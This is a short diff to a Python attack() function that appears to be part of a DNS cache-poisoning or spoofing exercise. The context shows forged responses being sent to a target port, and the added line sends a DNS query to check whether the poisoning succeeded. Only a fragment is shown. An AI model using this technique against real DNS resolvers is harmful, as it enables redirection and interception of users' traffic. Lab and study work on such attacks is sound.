@@ -85,6 +85,7 @@ def attack():
             sock.sendto(bytes(fake_response), (my_ip, query_port))
 
         # check to see if it worked
+        sock.sendto(bytes(dns_request), (my_ip, dns_port))
         data = sock.recv(1024)
         res = DNS(data[2:])
         try:
